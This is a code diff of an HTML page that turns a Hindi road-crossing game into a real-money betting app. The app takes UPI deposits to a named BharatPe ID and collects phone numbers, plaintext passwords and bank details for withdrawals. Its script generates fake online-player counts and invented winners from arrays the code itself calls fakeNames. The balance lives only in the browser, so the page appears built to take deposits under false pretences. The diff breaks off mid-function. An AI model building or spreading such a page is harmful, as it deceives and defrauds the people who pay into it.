@@ -1,242 +1,715 @@
 <!DOCTYPE html>
 <html lang="hi">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Murga Road Cross - Mahakal Edition</title>
-    <style>
-        * { box-sizing: border-box; }
-        body {
-            margin: 0;
-            background: linear-gradient(135deg, #1a1a1a, #2c3e50);
-            color: #fff;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            text-align: center;
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-        }
-        h2 { margin: 5px 0; color: #ffeb3b; font-size: 22px; text-shadow: 1px 1px 3px #000; }
-        #scoreboard {
-            font-size: 18px;
-            margin-bottom: 8px;
-            background: rgba(0, 0, 0, 0.4);
-            padding: 5px 15px;
-            border-radius: 20px;
-            border: 1px solid #ffeb3b;
-        }
-        #game-container {
-            position: relative;
-            width: 340px;
-            height: 460px;
-            background: #444;
-            border: 4px solid #fff;
-            border-radius: 10px;
-            overflow: hidden;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.6);
-        }
-        .road {
-            position: absolute;
-            width: 100%;
-            height: 70px;
-            background: #2b2b2b;
-            border-top: 2px dashed #ffeb3b;
-            border-bottom: 2px dashed #ffeb3b;
-        }
-        .safe-zone {
-            position: absolute;
-            width: 100%;
-            height: 60px;
-            background: #2e7d32;
-        }
-        #chicken {
-            position: absolute;
-            bottom: 10px;
-            left: 150px;
-            width: 35px;
-            height: 35px;
-            background: #ff9800;
-            border-radius: 50%;
-            text-align: center;
-            line-height: 35px;
-            font-size: 20px;
-            z-index: 10;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.5);
-            transition: left 0.1s ease;
-        }
-        .car {
-            position: absolute;
-            width: 55px;
-            height: 28px;
-            background: #e74c3c;
-            border-radius: 6px;
-            font-size: 12px;
-            text-align: center;
-            line-height: 28px;
-            color: white;
-            font-weight: bold;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.4);
-        }
-        .controls {
-            margin-top: 12px;
-            display: flex;
-            gap: 10px;
-        }
-        .btn {
-            padding: 10px 18px;
-            background: #27ae60;
-            color: white;
-            border: none;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            border-radius: 6px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
-            transition: 0.2s;
-        }
-        .btn:active { transform: scale(0.95); }
-        .btn-danger { background: #c0392b; }
-        .btn-side { background: #2980b9; padding: 10px 14px; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="manifest" href="manifest.json">
+<title>Thakur Sahab Creator Mahakal Battle</title>
+
+<meta property="og:title" content="Thakur Sahab Creator Mahakal Battle">
+<meta property="og:description" content="Paheliyan suljhayein aur Thakur Sahab Creator ke sath gaming ka anand lein!">
+<meta property="og:image" content="https://sandeepmahakal.github.io/mahakal-battle/1792858963757.png">
+<meta property="og:url" content="https://sandeepmahakal.github.io/mahakal-battle/">
+<meta property="og:type" content="website">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+<style>
+body {
+background-color: #0b0f19;
+color: #ffffff;
+font-family: Arial, sans-serif;
+text-align: center;
+margin: 0;
+padding: 10px;
+user-select: none;
+}
+.container {
+max-width: 420px;
+margin: auto;
+background: #131a26;
+padding: 15px;
+border-radius: 12px;
+border: 2px solid #ff7b00;
+box-shadow: 0 4px 20px rgba(255, 123, 0, 0.3);
+position: relative;
+}
+h2 { color: #ffab00; margin-top: 10px; cursor: pointer; font-size: 18px; }
+
+.top-badge {
+font-size: 11px;
+color: #ff9933;
+background: #1a2332;
+padding: 4px 12px;
+border-radius: 15px;
+border: 1px solid #ff9933;
+display: inline-block;
+margin-bottom: 5px;
+font-weight: bold;
+box-shadow: 0 0 10px rgba(255, 153, 51, 0.3);
+}
+
+.banner-img {
+width: 100%;
+max-height: 200px;
+object-fit: cover;
+border-radius: 8px;
+border: 1px solid #ffab00;
+margin-bottom: 12px;
+}
+
+.btn {
+background: linear-gradient(to right, #ff7b00, #ffaa00);
+color: white;
+border: none;
+padding: 12px;
+width: 100%;
+border-radius: 6px;
+font-size: 15px;
+font-weight: bold;
+cursor: pointer;
+margin-top: 10px;
+}
+.btn:hover { opacity: 0.9; }
+
+input, select, textarea {
+width: 90%;
+padding: 10px;
+margin: 8px 0;
+background: #1a2332;
+border: 1px solid #444;
+color: white;
+border-radius: 5px;
+text-align: center;
+font-size: 14px;
+}
+
+.wallet-box {
+background: linear-gradient(135deg, #2c1a00, #4d2600);
+padding: 12px;
+border-radius: 8px;
+margin-bottom: 12px;
+border: 1px solid #ffcc00;
+font-size: 14px;
+}
+
+.card-box {
+background: #1a2332;
+border: 1px solid #334155;
+border-radius: 8px;
+padding: 12px;
+margin: 10px 0;
+text-align: left;
+}
+
+.qr-img {
+width: 150px;
+height: 150px;
+background: white;
+padding: 6px;
+border-radius: 6px;
+margin: 8px auto;
+display: block;
+border: 2px solid #ffab00;
+}
+
+.admin-panel {
+background: #2a1a1a;
+border: 2px solid #ff5252;
+padding: 12px;
+border-radius: 8px;
+margin-top: 15px;
+text-align: left;
+display: none;
+font-size: 12px;
+}
+.hidden { display: none !important; }
+
+.fake-activity-box {
+background: linear-gradient(135deg, #064e3b, #022c22);
+border: 1px solid #10b981;
+border-radius: 8px;
+padding: 10px;
+margin-bottom: 12px;
+font-size: 13px;
+text-align: center;
+color: #34d399;
+}
+
+.live-bets-box {
+background: #1a2332;
+border: 1px solid #ff7b00;
+border-radius: 8px;
+padding: 10px;
+margin: 12px 0;
+text-align: left;
+font-size: 12px;
+max-height: 130px;
+overflow-y: auto;
+}
+.bet-row {
+display: flex;
+justify-content: space-between;
+padding: 4px 0;
+border-bottom: 1px dashed #334155;
+color: #cbd5e1;
+}
+
+/* Asli Highway Road Look */
+#game-container {
+    position: relative;
+    width: 100%;
+    height: 320px;
+    background: #111827;
+    border: 2px solid #ffab00;
+    border-radius: 10px;
+    overflow: hidden;
+    margin: 10px auto;
+}
+
+.road-track {
+    position: absolute;
+    width: 100%;
+    height: 90px;
+    background: #1f2937;
+    top: 110px;
+    border-top: 4px solid #374151;
+    border-bottom: 4px solid #374151;
+}
+
+.road-stripe {
+    position: absolute;
+    width: 100%;
+    height: 4px;
+    background: #facc15;
+    top: 153px;
+    box-shadow: 0 0 8px #facc15;
+}
+
+/* Red SUV Design (Left Side) */
+#m-car-left {
+    position: absolute;
+    width: 105px;
+    height: 45px;
+    background: linear-gradient(135deg, #dc2626, #991b1b);
+    top: 132px;
+    left: -140px;
+    border-radius: 8px 15px 6px 6px;
+    font-size: 12px;
+    text-align: center;
+    line-height: 45px;
+    font-weight: bold;
+    color: #fff;
+    border: 2px solid #fca5a5;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.8);
+    z-index: 5;
+}
+
+/* Blue SUV Design (Right Side) */
+#m-car-right {
+    position: absolute;
+    width: 105px;
+    height: 45px;
+    background: linear-gradient(135deg, #2563eb, #1e40af);
+    top: 132px;
+    left: 340px;
+    border-radius: 15px 8px 6px 6px;
+    font-size: 12px;
+    text-align: center;
+    line-height: 45px;
+    font-weight: bold;
+    color: #fff;
+    border: 2px solid #93c5fd;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.8);
+    z-index: 5;
+}
+
+.social-strip { 
+display: flex; 
+justify-content: center; 
+gap: 12px; 
+margin-top: 15px; 
+}
+.s-icon { 
+width: 36px; 
+height: 36px; 
+border-radius: 50%; 
+display: flex; 
+align-items: center; 
+justify-content: center; 
+color: #fff; 
+font-size: 14px; 
+text-decoration: none; 
+border: 1px solid #d4af37; 
+transition: 0.3s;
+}
+.s-icon:hover { transform: scale(1.1); }
+</style>
 </head>
 <body>
 
-    <h2>🐔 मुर्गा रोड क्रॉस गेम 🚗</h2>
-    <div id="scoreboard">पॉइंट्स / कमाई: ₹<span id="score">0</span></div>
+<div class="container">
 
-    <div id="game-container">
-        <!-- सुरक्षित जोन (शुरुआत और फिनिश) -->
-        <div class="safe-zone" style="bottom: 0;"></div>
-        <div class="safe-zone" style="top: 0;"></div>
+<div class="top-badge">🇮🇳 🟨 ⬜ 🟩 ThakurSahabCreator 🇮🇳</div>
+<h2 onclick="checkSecretAdminTap()">🔱 THAKUR SAHAB BATTLE 🔱</h2>
 
-        <!-- सड़कें -->
-        <div class="road" style="top: 120px;"></div>
-        <div class="road" style="top: 250px;"></div>
+<img src="1792858963757.png" alt="Mahakal Puzzle Battle Banner" class="banner-img">
+
+<!-- LOGIN SECTION -->
+<div id="login-section">
+<div class="card-box" style="text-align: center;" id="login-form-box">
+<h3 style="color: #ffab00; margin-top: 0; font-size: 16px;">🔐 सुरक्षित लॉगिन & ₹19 इंस्टेंट बोनस</h3>
+<p style="font-size: 11px; color: #aaa;">खेलने के लिए अपना 10 अंकों का मोबाइल नंबर और पासवर्ड दर्ज करें:</p>
+<input type="tel" id="login-phone" placeholder="10 अंकों का मोबाइल नंबर" maxlength="10">
+<input type="password" id="login-pass" placeholder="पासवर्ड दर्ज करें">
+<button class="btn" onclick="processLogin()">सुरक्षित लॉगिन करें</button>
+<button class="btn" style="background: #334155; font-size: 12px; padding: 8px;" onclick="showResetBox()">पासवर्ड भूल गए? Reset Karein</button>
+<div id="login-msg"></div>
+</div>
+
+<div class="card-box" style="text-align: center; display: none;" id="reset-form-box">
+<h3 style="color: #ffab00; margin-top: 0; font-size: 16px;">🔄 पासवर्ड रीसेट करें</h3>
+<input type="tel" id="reset-phone" placeholder="10 अंकों का मोबाइल नंबर" maxlength="10">
+<input type="password" id="reset-pass1" placeholder="नया पासवर्ड (1st Time)">
+<input type="password" id="reset-pass2" placeholder="पासवर्ड दोबारा (2nd Time)">
+<input type="password" id="reset-pass3" placeholder="पासवर्ड पक्का करें (3rd Time)">
+<button class="btn" style="background: #eab308; color: #000;" onclick="processResetPassword()">पासवर्ड अपडेट करें (OK)</button>
+<button class="btn" style="background: #334155; font-size: 12px; padding: 8px;" onclick="backToLoginBox()">वापस लॉगिन पर जाएं</button>
+<div id="reset-msg"></div>
+</div>
+</div>
+
+<!-- DASHBOARD SECTION -->
+<div id="app-dashboard" class="hidden">
+
+<div id="fake-activity-container" class="fake-activity-box">
+    🟢 <b>Live Online Players:</b> <span id="fake-online-count" style="font-weight: bold; color: #fff;">628</span> Active Now<br>
+    <span style="font-size: 11px; color: #a7f3d0;" id="fake-winner-ticker">🏆 राहुल (Kanpur) ne abhi Mahakal Puzzle से ₹500 jeete!</span>
+</div>
+
+<div id="real-admin-container" class="fake-activity-box" style="background: linear-gradient(135deg, #1e3a8a, #1e1b4b); border: 1px solid #3b82f6; display: none; text-align: left; padding: 12px;">
+    👑 <b style="color: #60a5fa;">Admin Real-Time Customer View:</b><br>
+    👥 Total Real Registered Users: <span id="real-users-count" style="color: #fff; font-weight: bold;">0</span><br>
+    <div id="real-users-list" style="margin-top: 8px; font-size: 11px; max-height: 120px; overflow-y: auto; background: rgba(0,0,0,0.3); padding: 6px; border-radius: 4px;">No users registered yet.</div>
+</div>
+
+<div class="wallet-box">
+<h3>💰 मेरा वॉलेट: ₹<span id="balance">19</span></h3>
+</div>
+
+<button class="btn" style="background: linear-gradient(to right, #ff5722, #ff9800);" onclick="openSection('puzzle-section')">🧠 1. कठिन पहेली गेम</button>
+<button class="btn" style="background: linear-gradient(to right, #673ab7, #9c27b0);" onclick="openSection('ludo-section')">🎲 2. लूडो पासा बैटल</button>
+<button class="btn" style="background: linear-gradient(to right, #ff1493, #ff69b4);" onclick="openSection('murga-section')">🐔 3. मुर्गा रोड क्रॉस गेम (Dual Side Traffic)</button>
+<button class="btn" style="background: linear-gradient(to right, #00897b, #00acc1);" onclick="openSection('deposit-section')">📥 4. पैसे जोड़े (BharatPe QR Deposit)</button>
+<button class="btn" style="background: linear-gradient(to right, #00c853, #64dd17);" onclick="openSection('bank-section')">🏦 5. बैंक में पैसे भेजें (Withdrawal)</button>
+<button class="btn" style="background: linear-gradient(to right, #eab308, #ca8a04);" onclick="openSection('refer-section')">🎁 6. शेयर करें और 3% कमीशन पाएं</button>
+
+<div id="public-live-bets-section">
+<div style="font-size: 13px; color: #ffab00; font-weight: bold; margin-top: 15px; text-align: left;">🔥 Live Users Playing & Winning Feed:</div>
+<div class="live-bets-box" id="live-bets-feed">
+    <div class="bet-row"><span>👤 Rohit (Agra) - Puzzle</span><span style="color: #00e676;">Won ₹200</span></div>
+    <div class="bet-row"><span>👤 Amit (Kanpur) - Murga Game</span><span style="color: #00e676;">Won ₹450</span></div>
+</div>
+</div>
+
+</div>
+
+<!-- SUB-SECTIONS -->
+<div id="puzzle-section" class="hidden">
+<div class="card-box">
+<h3 style="color: #ffab00; margin-top: 0;">🧠 कठिन पहेली गेम</h3>
+<input type="number" id="p-bet" value="10" min="5">
+<p id="p-question" style="font-size: 14px; color: #ffab00; font-weight: bold; text-align: left;"></p>
+<div id="p-options">
+<button class="btn" style="padding:8px; margin:5px 0; text-align:left;" onclick="checkPuzzle('A')">A. <span id="optA"></span></button>
+<button class="btn" style="padding:8px; margin:5px 0; text-align:left;" onclick="checkPuzzle('B')">B. <span id="optB"></span></button>
+<button class="btn" style="padding:8px; margin:5px 0; text-align:left;" onclick="checkPuzzle('C')">C. <span id="optC"></span></button>
+<button class="btn" style="padding:8px; margin:5px 0; text-align:left;" onclick="checkPuzzle('D')">D. <span id="optD"></span></button>
+</div>
+<div id="p-result"></div>
+</div>
+<button class="btn" style="background:#555;" onclick="backToDashboard()">डैशबोर्ड पर वापस जाएं</button>
+</div>
+
+<div id="ludo-section" class="hidden">
+<div class="card-box" style="text-align: center;">
+<h3 style="color: #ffab00; margin-top: 0;">🎲 लूडो पासा बैटल</h3>
+<input type="number" id="l-bet" value="10" min="5">
+<div style="font-size: 50px; background: #121212; border: 2px solid #ffab00; border-radius: 8px; width: 70px; height: 70px; margin: 10px auto; display: flex; align-items: center; justify-content: center;" id="dice-view">🎲</div>
+<button class="btn" onclick="rollDice()">पासा फेंको (Roll)</button>
+<div id="l-result"></div>
+</div>
+<button class="btn" style="background:#555;" onclick="backToDashboard()">डैशबोर्ड पर वापस जाएं</button>
+</div>
+
+<!-- MURGA GAME SECTION -->
+<div id="murga-section" class="hidden">
+<div class="card-box" style="text-align: center;">
+<h3 style="color: #ffab00; margin-top: 0;">🐔 मुर्गा रोड क्रॉस गेम (Dual Side Traffic)</h3>
+<p style="font-size: 12px; color: #aaa; margin: 2px 0;">दोनो तरफ से गाड़ियां चलेंगी और रुकेंगी (2x Double Win)!</p>
+
+<div id="game-container">
+    <!-- Asli Sadak Track -->
+    <div class="road-track"></div>
+    <div class="road-stripe"></div>
+    
+    <!-- Red SUV (Left Side) -->
+    <div id="m-car-left">🚗 Red SUV</div>
+
+    <!-- Blue SUV (Right Side) -->
+    <div id="m-car-right">🚙 Blue SUV</div>
+
+    <!-- Big Murga with Legs -->
+    <div id="m-chicken" style="position: absolute; bottom: 20px; left: 140px; z-index: 10; transition: transform 0.2s ease-in-out;">
+        <svg width="65" height="65" viewBox="0 0 100 100">
+            <ellipse cx="50" cy="55" rx="32" ry="24" fill="#ffffff" stroke="#ffab00" stroke-width="3"/>
+            <circle cx="72" cy="32" r="16" fill="#ffffff" stroke="#ffab00" stroke-width="3"/>
+            <path d="M66 16 Q72 6 78 16 Q84 6 90 16 Z" fill="#dc2626"/>
+            <polygon points="88,32 98,35 88,40" fill="#f59e0b"/>
+            <circle cx="77" cy="29" r="3.5" fill="#000"/>
+            <line x1="38" y1="78" x2="38" y2="98" stroke="#f59e0b" stroke-width="5" stroke-linecap="round"/>
+            <line x1="62" y1="78" x2="62" y2="98" stroke="#f59e0b" stroke-width="5" stroke-linecap="round"/>
+            <line x1="30" y1="98" x2="46" y2="98" stroke="#f59e0b" stroke-width="5" stroke-linecap="round"/>
+            <line x1="54" y1="98" x2="70" y2="98" stroke="#f59e0b" stroke-width="5" stroke-linecap="round"/>
+        </svg>
+    </div>
+</div>
+
+<p style="font-size: 13px; color: #00e676; font-weight: bold;">Score / Safe Crosses: <span id="m-score">0</span></p>
+
+<!-- Play Button aur Bet Amount -->
+<div style="background: #111827; padding: 12px; border-radius: 8px; border: 1px solid #374151; margin-top: 10px;">
+    <div style="display: flex; gap: 8px; align-items: center; justify-content: center; margin-bottom: 8px;">
+        <label style="font-size: 13px; color: #ffab00; font-weight: bold;">Bet Amount (₹):</label>
+        <input type="number" id="m-bet" value="50" min="5" style="width: 100px; padding: 6px; margin: 0; text-align: center; font-weight: bold;">
+    </div>
+    <button class="btn" style="background: linear-gradient(to right, #16a34a, #22c55e); padding: 12px; font-size: 15px; margin-top: 0;" onclick="mJumpAndPlay()">🚀 Jump & Play (आगे बढ़ें)</button>
+</div>
+
+<div id="m-result-msg" style="margin-top: 8px; font-size: 13px; font-weight: bold; min-height: 25px;"></div>
+</div>
+<button class="btn" style="background:#555; margin-top: 10px;" onclick="backToDashboard()">डैशबोर्ड पर वापस जाएं</button>
+</div>
+
+<!-- DEPOSIT SECTION -->
+<div id="deposit-section" class="hidden">
+<div class="card-box" style="text-align: center;">
+<h3 style="color: #ffab00; margin-top: 0;">📥 पैसे जोड़े (QR Deposit)</h3>
+<img src="qrcode.jpg" alt="QR" class="qr-img">
+<p style="font-size: 11px; color: #aaa;">UPI ID: BHARATPE2G0F0C1Y8Q38903@unitype</p>
+<a href="upi://pay?pa=BHARATPE2G0F0C1Y8Q38903@unitype&pn=ThakurSahabMahakalBattle&cu=INR" class="btn" style="background: #25D366; color: #000; text-decoration: none; display: block; padding: 12px; margin: 10px 0; font-weight: bold; border-radius: 6px; text-align: center;">📱 Pay via PhonePe / GPay / Paytm</a>
+<input type="number" id="dep-amount" placeholder="राशि दर्ज करें (उदा. 100)" min="100">
+<input type="text" id="dep-upinumber" placeholder="UPI Number / UPI ID दर्ज करें">
+<input type="text" id="dep-txnid" placeholder="UPI Txn ID दर्ज करें">
+<button class="btn" style="background: #00897b;" onclick="sendDepositReq()">डिपॉजिट अनुरोध भेजें</button>
+<div id="dep-msg"></div>
+</div>
+<button class="btn" style="background:#555;" onclick="backToDashboard()">डैशबोर्ड पर वापस जाएं</button>
+</div>
+
+<div id="bank-section" class="hidden">
+<div class="card-box">
+<h3 style="color: #00e676; margin-top: 0; text-align: center;">🏦 बैंक ट्रांसफर (Withdrawal)</h3>
+<select id="b-name">
+<option value="">-- बैंक चुनें --</option>
+<option value="Punjab National Bank (PNB)">Punjab National Bank (PNB)</option>
+<option value="State Bank of India (SBI)">State Bank of India (SBI)</option>
+<option value="Bank of Baroda (BOB)">Bank of Baroda (BOB)</option>
+</select>
+<input type="text" id="b-holder" placeholder="खाता धारक का नाम">
+<input type="text" id="b-acc" placeholder="अकाउंट नंबर">
+<input type="text" id="b-ifsc" placeholder="IFSC कोड">
+<input type="number" id="b-amt" placeholder="राशि (न्यूनतम ₹2500)" min="2500">
+<button class="btn" style="background: #00c853;" onclick="sendWithdrawReq()">विथड्रॉवल लगाएं</button>
+<div id="bank-msg"></div>
+</div>
+<button class="btn" style="background:#555;" onclick="backToDashboard()">डैशबोर्ड पर वापस जाएं</button>
+</div>
+
+<div id="refer-section" class="hidden">
+<div class="card-box" style="text-align: center;">
+<h3 style="color: #ffab00; margin-top: 0;">🎁 शेयर करें और 3% कमीशन पाएं</h3>
+<input type="text" id="ref-link-input" readonly style="background:#121212; color:#ffab00; font-weight:bold; text-align:center;">
+<button class="btn" style="background: #00897b; margin-top: 5px;" onclick="copyReferLink()">🔗 लिंक कॉपी करें</button>
+<button class="btn" style="background: #25D366; color: #000; margin-top: 5px;" onclick="shareOnWhatsApp()">💬 WhatsApp पर शेयर करें</button>
+</div>
+<button class="btn" style="background:#555;" onclick="backToDashboard()">डैशबोर्ड पर वापस जाएं</button>
+</div>
+
+<!-- ADMIN PANEL -->
+<div id="admin-panel-div" class="admin-panel">
+<b style="color: #ff5252;">👑 मास्टर एडमिन कंट्रोल पैनल:</b>
+<hr style="border-color: #444; margin: 5px 0;">
+<button class="btn" style="background: #555; padding: 5px; margin-top: 8px;" onclick="closeAdmin()">एडमिन बंद करें</button>
+</div>
+
+<!-- SOCIAL ICONS -->
+<div class="social-strip">
+    <a href="https://t.me/YOUR_USERNAME" target="_blank" class="s-icon" style="background:#0088cc" title="Telegram"><i class="fab fa-telegram-plane"></i></a>
+    <a href="javascript:void(0);" class="s-icon" style="background:#1877F2; opacity:0.5;" title="Facebook"><i class="fab fa-facebook-f"></i></a>
+    <a href="javascript:void(0);" class="s-icon" style="background:#E1306C; opacity:0.5;" title="Instagram"><i class="fab fa-instagram"></i></a>
+    <a href="javascript:void(0);" class="s-icon" style="background:#25D366; opacity:0.5;" title="WhatsApp"><i class="fab fa-whatsapp"></i></a>
+</div>
+
+</div>
+
+<script>
+let walletBalance = 19; 
+let loggedInPhone = ""; 
+let isAdminLoggedIn = false;
+
+window.onload = function() {
+  let savedBal = localStorage.getItem('mahakal_master_wallet');
+  if(savedBal !== null) walletBalance = parseFloat(savedBal);
+  document.getElementById('balance').innerText = walletBalance;
+  loadPuzzle();
+  mResetGame();
+};
+
+const fakeNames = ["Rahul (Kanpur)", "Amit (Lucknow)", "Vikas (Etawah)", "Deepak (Unnao)", "Rohit (Agra)", "Pooja (Delhi)"];
+const fakeGamesList = ["Puzzle Battle", "Ludo Paasa", "Murga Game"];
+
+function updateFakeActivity() {
+    let countEl = document.getElementById('fake-online-count');
+    let tickerEl = document.getElementById('fake-winner-ticker');
+    let feedEl = document.getElementById('live-bets-feed');
+
+    if(countEl && !isAdminLoggedIn) {
+        countEl.innerText = Math.floor(Math.random() * 100) + 600;
+        let rName = fakeNames[Math.floor(Math.random() * fakeNames.length)];
+        tickerEl.innerHTML = `🏆 ${rName} ne abhi game se ₹500 jeete!`;
+
+        if(feedEl) {
+            let g1 = fakeGamesList[Math.floor(Math.random() * fakeGamesList.length)];
+            let amt1 = (Math.floor(Math.random() * 9) + 1) * 50;
+            feedEl.innerHTML = `
+                <div class="bet-row"><span>👤 ${fakeNames[Math.floor(Math.random()*fakeNames.length)]} - ${g1}</span><span style="color: #00e676;">Won ₹${amt1}</span></div>
+                <div class="bet-row"><span>👤 ${fakeNames[Math.floor(Math.random()*fakeNames.length)]} - Murga Game</span><span style="color: #00e676;">Won ₹${amt1 * 2}</span></div>
+            `;
+        }
+    }
+}
+setInterval(updateFakeActivity, 3500);
+
+function saveWallet() {
+  document.getElementById('balance').innerText = walletBalance;
+  localStorage.setItem('mahakal_master_wallet', walletBalance);
+}
+
+function processLogin() {
+  let ph = document.getElementById('login-phone').value.trim();
+  let ps = document.getElementById('login-pass').value.trim();
+  let msg = document.getElementById('login-msg');
+
+  if(ph.length !== 10 || isNaN(ph)) { msg.className = "error"; msg.innerText = "❌ सही 10 अंकों का नंबर डालें!"; return; }
+  if(!ps) { msg.className = "error"; msg.innerText = "❌ पासवर्ड डालें!"; return; }
+
+  loggedInPhone = ph;
+  let registeredUsers = JSON.parse(localStorage.getItem('mahakal_users_db') || "{}");
+  
+  if(!registeredUsers[ph]) {
+    registeredUsers[ph] = ps;
+    localStorage.setItem('mahakal_users_db', JSON.stringify(registeredUsers));
+    walletBalance += 19;
+    saveWallet();
+  }
+
+  document.getElementById('login-section').classList.add('hidden');
+  document.getElementById('app-dashboard').classList.remove('hidden');
+}
+
+function openSection(secId) {
+  document.getElementById('app-dashboard').classList.add('hidden');
+  document.querySelectorAll('.container > div').forEach(d => {
+    if(d.id !== 'admin-panel-div' && d.id !== 'login-section' && d.id !== 'app-dashboard') d.classList.add('hidden');
+  });
+  document.getElementById(secId).classList.remove('hidden');
+
+  if(secId === 'refer-section') {
+    document.getElementById('ref-link-input').value = window.location.href;
+  }
+}
+
+function backToDashboard() {
+  document.querySelectorAll('.container > div').forEach(d => {
+    if(d.id !== 'admin-panel-div' && d.id !== 'login-section' && d.id !== 'app-dashboard') d.classList.add('hidden');
+  });
+  document.getElementById('app-dashboard').classList.remove('hidden');
+}
+
+let puzzles = [{q: "हरी थी मन भरी थी, मोती जड़ित थार थी?", opts: {A: "भुट्टा", B: "घास", C: "पत्ता", D: "अंगूर"}, ans: "A"}];
+let currentP = 0;
+
+function loadPuzzle() {
+  let p = puzzles[currentP];
+  document.getElementById('p-question').innerText = "❓ " + p.q;
+  document.getElementById('optA').innerText = p.opts.A;
+  document.getElementById('optB').innerText = p.opts.B;
+  document.getElementById('optC').innerText = p.opts.C;
+  document.getElementById('optD').innerText = p.opts.D;
+}
+
+function checkPuzzle(choice) {
+  let bet = parseInt(document.getElementById('p-bet').value);
+  if(walletBalance < bet) { alert("बैलेंस कम है!"); return; }
+  walletBalance -= bet;
+  if(choice === puzzles[currentP].ans) {
+    walletBalance += bet * 2;
+    document.getElementById('p-result').innerText = "🎉 सही जवाब! जीत गए।";
+  } else {
+    document.getElementById('p-result').innerText = "❌ गलत जवाब!";
+  }
+  saveWallet();
+}
+
+function rollDice() {
+  let bet = parseInt(document.getElementById('l-bet').value);
+  if(walletBalance < bet) { alert("बैलेंस कम है!"); return; }
+  walletBalance -= bet;
+  let roll = Math.floor(Math.random() * 6) + 1;
+  document.getElementById('dice-view').innerText = roll;
+  if(roll >= 4) {
+    walletBalance += bet * 2;
+    document.getElementById('l-result').innerText = `🎉 पासा [${roll}] - जीत गए!`;
+  } else {
+    document.getElementById('l-result').innerText = `❌ पासा [${roll}] - हार गए।`;
+  }
+  saveWallet();
+}
+
+/* Dual Side Traffic Active Murga Game Script */
+let mScore = 0;
+let mIsGameRunning = false;
+
+function mResetGame() {
+    mIsGameRunning = false;
+    let carLeft = document.getElementById('m-car-left');
+    let carRight = document.getElementById('m-car-right');
+    if(carLeft) {
+        carLeft.style.left = "-140px";
+        carLeft.innerText = "🚗 Red SUV";
+    }
+    if(carRight) {
+        carRight.style.left = "340px";
+        carRight.innerText = "🚙 Blue SUV";
+    }
+    let chickenEl = document.getElementById('m-chicken');
+    if(chickenEl) {
+        chickenEl.style.transform = "translateY(0px)";
+    }
+}
+
+function mJumpAndPlay() {
+    if(mIsGameRunning) return;
+    
+    let betInput = document.getElementById('m-bet');
+    let bet = parseInt(betInput ? betInput.value : 50);
+    
+    if(walletBalance < bet) {
+        alert("❌ वॉलेट में पर्याप्त बैलेंस नहीं है!");
+        return;
+    }
+    
+    walletBalance -= bet;
+    saveWallet();
+
+    mIsGameRunning = true;
+    document.getElementById('m-result-msg').innerHTML = "";
+    let carLeft = document.getElementById('m-car-left');
+    let carRight = document.getElementById('m-car-right');
+    
+    let leftX = -140;
+    let rightX = 340;
+    
+    let stopLeft = 20;    // Red SUV yahan aakar rukegi
+    let stopRight = 190;  // Blue SUV yahan aakar rukegi (dono ke beech mein gap rahega)
+    
+    let moveInterval = setInterval(() => {
+        leftX += 5;
+        rightX -= 5;
         
-        <!-- गाड़ियाँ (Obstacles) -->
-        <div class="car" id="car1" style="top: 140px; left: -70px;">🚗 कार</div>
-        <div class="car" id="car2" style="top: 270px; left: 340px; background: #2980b9;">🚙 जीप</div>
-
-        <!-- मुर्गा कैरेक्टर -->
-        <div id="chicken">🐔</div>
-    </div>
-
-    <!-- कंट्रोल बटन (मोबाइल और पीसी दोनों के लिए) -->
-    <div class="controls">
-        <button class="btn btn-side" onclick="moveLeft()">◀️ बाएं</button>
-        <button class="btn" onclick="moveChicken()">आगे कूदो ⬆️</button>
-        <button class="btn btn-side" onclick="moveRight()">दाएं ▶️</button>
-    </div>
-    <button class="btn btn-danger" style="margin-top: 8px; padding: 6px 12px; font-size: 14px;" onclick="resetGame()">रीस्टार्ट गेम 🔄</button>
-
-    <script>
-        let chicken = document.getElementById("chicken");
-        let car1 = document.getElementById("car1");
-        let car2 = document.getElementById("car2");
-        let scoreDisplay = document.getElementById("score");
-
-        let chickenY = 410; // नीचे से शुरू
-        let chickenX = 150;
-        let score = 0;
-        let isAlive = true;
-
-        let car1X = -70;
-        let car2X = 340;
-
-        // मुर्गे को बाएं ले जाने के लिए
-        function moveLeft() {
-            if (!isAlive) return;
-            if (chickenX > 10) chickenX -= 20;
-            chicken.style.left = chickenX + "px";
+        if(carLeft && leftX <= stopLeft) {
+            carLeft.style.left = leftX + "px";
         }
-
-        // मुर्गे को दाएं ले जाने के लिए
-        function moveRight() {
-            if (!isAlive) return;
-            if (chickenX < 290) chickenX += 20;
-            chicken.style.left = chickenX + "px";
+        if(carRight && rightX >= stopRight) {
+            carRight.style.left = rightX + "px";
         }
-
-        // मुर्गे को आगे (ऊपर) कूदने के लिए
-        function moveChicken() {
-            if (!isAlive) return;
-            chickenY -= 50; 
-            if (chickenY < 20) {
-                score += 10; // रोड पार करने पर ₹10 मिल गए
-                scoreDisplay.innerText = score;
-                alert("शानदार! मुर्गा सुरक्षित पार हो गया! +₹10 जीत गए 🎉");
-                resetChicken();
-            }
+        
+        if(leftX >= stopLeft && rightX <= stopRight) {
+            clearInterval(moveInterval);
+            if(carLeft) carLeft.innerText = "🛑 Red SUV";
+            if(carRight) carRight.innerText = "🛑 Blue SUV";
+            
+            // Murga Jump
+            let chickenEl = document.getElementById('m-chicken');
+            if(chickenEl) chickenEl.style.transform = "translateY(-65px)";
+            
+            let isSafeJump = Math.random() > 0.4; // 60% win chance
+            
+            setTimeout(() => {
+                if(chickenEl) chickenEl.style.transform = "translateY(0px)";
+                
+                if(isSafeJump) {
+                    mScore += 1;
+                    let winAmt = bet * 2;
+                    walletBalance += winAmt;
+                    saveWallet();
+                    document.getElementById('m-score').innerText = mScore;
